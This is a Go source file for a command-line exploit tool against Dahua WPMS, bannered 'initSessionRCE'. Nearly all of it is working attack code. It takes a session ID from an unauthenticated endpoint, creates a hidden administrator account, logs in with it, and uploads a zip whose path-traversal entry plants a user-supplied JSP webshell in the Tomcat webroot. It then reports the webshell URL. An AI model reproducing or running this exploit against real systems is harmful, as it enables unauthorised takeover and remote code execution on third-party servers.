// @File    :   main.go
// @Time    :   2023/06/01 09:09:05
// @Author  :   _0xf4n9x_
// @Version :   1.0
// @Contact :   m4rtin.hsu@gmail.com

package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	mrand "math/rand"
	neturl "net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/projectdiscovery/gologger"
)

// https://patorjk.com/software/taag/#p=display&f=Slant&t=DaHua-WPMS%0AinitSessionRCE
const banner = `
    ____        __  __                _       ______  __  ________     
   / __ \____ _/ / / /_  ______ _    | |     / / __ \/  |/  / ___/     
  / / / / __ '/ /_/ / / / / __ '/____| | /| / / /_/ / /|_/ /\__ \      
 / /_/ / /_/ / __  / /_/ / /_/ /_____/ |/ |/ / ____/ /  / /___/ /      
/_____/\__,_/_/ /_/\__,_/\__,_/      |__/|__/_/   /_/  /_//____/       
    _       _ __  _____                _             ____  ____________
   (_)___  (_) /_/ ___/___  __________(_)___  ____  / __ \/ ____/ ____/
  / / __ \/ / __/\__ \/ _ \/ ___/ ___/ / __ \/ __ \/ /_/ / /   / __/   
 / / / / / / /_ ___/ /  __(__  |__  ) / /_/ / / / / _, _/ /___/ /___   
/_/_/ /_/_/\__//____/\___/____/____/_/\____/_/ /_/_/ |_|\____/_____/   
                                                                       `

var (
	h        bool   // Help
	url      string // Target URL
	proxyURL string // Proxy
	stdin    bool   // Stdin
	baseURL  string // WebRoot Path
	timeout  int    // Timeout
	token    string // Token
	file     string // FileName
)

func showBanner() {
	gologger.Print().Msgf("%s\n", banner)
}

func hasStdin() bool {
	stat, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	isPipedFromChrDev := (stat.Mode() & os.ModeCharDevice) == 0
	isPipedFromFIFO := (stat.Mode() & os.ModeNamedPipe) != 0
	return isPipedFromChrDev || isPipedFromFIFO
}

func init() {
	flag.BoolVar(&h, "h", false, "显示帮助信息")
	flag.StringVar(&url, "u", "", "目标URL，例如: -u https://example.com")
	flag.StringVar(&proxyURL, "p", "", "使用代理，例如: -p http://127.0.0.1:8080")
	flag.StringVar(&file, "f", "", "期望上传的文件，例如：-f shell.jsp")
	flag.IntVar(&timeout, "t", 15, "请求超时时间，例如：-t 20")
	flag.Parse()

	stdin = hasStdin()

	showBanner()

	// -h flag or no flag, no stdin
	if h || (len(os.Args) == 1 && !stdin) {
		flag.Usage()
		os.Exit(0)
	}

	// no url and no stdin
	if url == "" && !stdin {
		gologger.Error().Msg("目标不能为空，使用-h参数查看帮助信息。\n\n")
		os.Exit(0)
	}

	// stdin to url
	if stdin && url == "" {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			t := scanner.Text()
			if t == "" {
				continue
			}
			url = t
		}
	}

	// check url format.
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		gologger.Error().Msg("请检查输入的目标URL格式，请以http开头！\n\n")
		os.Exit(0)
	}

	// 判断文件是否存在
	if file != "" {
		// 使用 os.Stat() 函数获取文件信息
		_, err := os.Stat(file)

		if os.IsNotExist(err) {
			gologger.Error().Msg("提供的文件不存在！\n\n")
			os.Exit(0)
		}
	}
}

func main() {
	gologger.Print().Label("INFO").Msg("Target: " + url)
	exploit(url, proxyURL, file)
}

func exploit(url string, proxyURL string, fileName string) bool {
	client := resty.New()
	client.SetTimeout(time.Duration(timeout) * time.Second)

	if proxyURL != "" {
		gologger.Print().Label("INFO").Msg("Proxy: " + proxyURL)
		client.SetProxy(proxyURL)
	}

	u, _ := neturl.Parse(url)

	baseURL = u.Scheme + "://" + u.Host

	userAgent := "Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36 Edg/111.0.1717.52"

	// 1. Get JSESSIONID
	sResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		Get(baseURL + "/admin/sso_initSession.action")

	// cookies := sResp.Header().Get("Set-Cookie")
	// jsessionID := extractJSessionID(cookies)
	re := regexp.MustCompile(`\b([A-Z0-9]{32})\b`)
	matches := re.FindStringSubmatch(string(sResp.Body()))

	if len(matches) > 1 {
		gologger.Print().Label("INFO").Msg("JSESSIONID: " + matches[1])
	} else {
		gologger.Print().Label("ERR").Msg(" JSESSIONID未找到，目标站点不存在漏洞")
		return false
	}
	jsessionID := matches[1]

	// 2. Save User
	username := genRandStr(5)
	password := genRandStr(8)

	uBody := "------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.userType\"\r\n\r\n0\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.ownerCode\"\r\n\r\n001\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.isReuse\"\r\n\r\n0\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.macStat\"\r\n\r\n0\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.roleIds\"\r\n\r\n1\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.loginName\"\r\n\r\n" + username + "\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"displayedOrgName\"\r\n\r\n" + username + "\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.loginPass\"\r\n\r\n" + password + "\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"checkPass\"\r\n\r\n" + password + "\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.groupId\"\r\n\r\n0\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG\r\nContent-Disposition: form-data; name=\"userBean.userName\"\r\n\r\n" + username + "\r\n------WebKitFormBoundaryGnojCBe8HkJXSuHG--"

	headers := map[string]string{
		"User-Agent":   userAgent,
		"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryGnojCBe8HkJXSuHG",
		"Cookie":       "JSESSIONID=" + jsessionID,
	}

	uResp, _ := client.R().
		SetHeaders(headers).
		SetBody(uBody).
		Post(baseURL + "/admin/user_save.action")

	if uResp.StatusCode() != 200 || uResp.String() != "" {
		gologger.Print().Label("ERR").Msg(" 创建用户失败")
		return false
	}

	// 3. Login
	// 3.1 getPublicKey
	pResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		SetHeader("Content-Type", "application/json").
		SetBody(map[string]interface{}{"loginName": username}).
		Post(baseURL + "/WPMS/getPublicKey")

	if !strings.Contains(string(pResp.Body()), `success":"true`) {
		gologger.Print().Label("ERR").Msg(" PublicKey获取失败")
		return false
	}

	var pData map[string]interface{}
	if err := json.Unmarshal([]byte(pResp.String()), &pData); err != nil {
		gologger.Print().Label("ERR").Msg(" Error parsing JSON")
		return false
	}

	publicKey, _ := pData["publicKey"].(string)
	// gologger.Print().Label("INFO").Msg("publicKey: " + publicKey)

	// 3.2 WPMS login
	loginPass, _ := encryptPassword(publicKey, password)

	timestamp := generateTimestamp()

	lResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		SetHeader("Content-Type", "application/json").
		SetBody(map[string]interface{}{"loginName": username, "loginPass": loginPass, "timestamp": timestamp}).
		Post(baseURL + "/WPMS/login")

	if lResp.StatusCode() == 200 && strings.Contains(string(lResp.Body()), `success":"true`) {
		gologger.Print().Label("INFO").Msg("Username/Password: " + username + "/" + password)
	}

	var lData map[string]interface{}
	if err := json.Unmarshal([]byte(lResp.String()), &lData); err != nil {
		gologger.Print().Label("ERR").Msg(" Error parsing JSON")
		return false
	}
	token, _ = lData["token"].(string)
	// gologger.Print().Label("INFO").Msg("Token: " + token)

	if fileName == "" {
		return true
	}

	// 4. Request login_login.action
	loginResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		Get(baseURL + "/admin/login_login.action?subSystemToken=" + token)

	if loginResp.StatusCode() != 200 && strings.Contains(string(loginResp.Body()), "username_content\">"+username) {
		gologger.Print().Label("ERR").Msg(" login_login.action请求失败")
		return false
	}

	// 5. Generate Evil Zip File
	filename, zipContent := genEvilZip(file)

	// 6. Upload Zip
	gologger.Print().Label("INFO").Msg("上传恶意ZIP文件中……")
	rResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		SetFileReader("recoverFile", genRandStr(6)+".zip", bytes.NewReader(zipContent)).
		SetHeader("Accept-Encoding", "gzip, deflate").
		SetHeader("Content-Type", "application/zip").
		Post(baseURL + "/admin/recover_recover.action?password=" + fmt.Sprintf("%x", md5.Sum([]byte(username+":dss:"+password))))

	if rResp.StatusCode() != 200 || rResp.String() != "" {
		gologger.Print().Label("ERR").Msg(" 上传恶意ZIP文件失败")
		return false
	}

	// 7. Request Webshell
	webShellPath := "/upload/" + filename
	shellResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		Get(baseURL + webShellPath)
	if shellResp.StatusCode() == 404 {
		gologger.Print().Label("ERR").Msg(" Webshell上传失败")
		return false
	}

	gologger.Print().Label("INFO").Msg("Webshell: " + baseURL + webShellPath)

	return true
}

func genEvilZip(file string) (string, []byte) {
	filename := genRandStr(12) + ".jsp"

	buf := new(bytes.Buffer)
	writer := zip.NewWriter(buf)
	defer writer.Close()
	evilpath := "../../../../../../../../../../../../../opt/tomcat/webapps/upload/" + filename
	f, _ := writer.Create(evilpath)

	var content []byte
	content, _ = ioutil.ReadFile(filepath.Clean(file))

	f.Write(content)
	_ = writer.Close()

	return filename, buf.Bytes()
}

func genRandStr(length int) string {
	const (
		charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	)
	var seededRand *mrand.Rand = mrand.New(mrand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func generateTimestamp() string {
	timestampNano := time.Now().UnixNano()
	t := timestampNano / int64(time.Millisecond)
	randomNumber := mrand.Intn(1000) + 1

	return strconv.FormatInt(t, 10) + strconv.Itoa(randomNumber)
}

func encryptPassword(publicKeyStr string, password string) (string, error) {
	publicKeyBytes, err := base64.StdEncoding.DecodeString(publicKeyStr)
	if err != nil {
		return "", fmt.Errorf("error decoding public key: %v", err)
	}

	publicKey, err := x509.ParsePKIXPublicKey(publicKeyBytes)
	if err != nil {
		return "", fmt.Errorf("error parsing public key: %v", err)
	}

	rsaPublicKey, ok := publicKey.(*rsa.PublicKey)
	if !ok {
		return "", fmt.Errorf("failed to convert public key to *rsa.PublicKey")
	}

	passwordBytes := []byte(password)
	passwordEncode, err := rsa.EncryptPKCS1v15(rand.Reader, rsaPublicKey, passwordBytes)
	if err != nil {
		return "", fmt.Errorf("error encrypting password: %v", err)
	}

	passwordEncodeStr := base64.StdEncoding.EncodeToString(passwordEncode)

	return passwordEncodeStr, nil
}
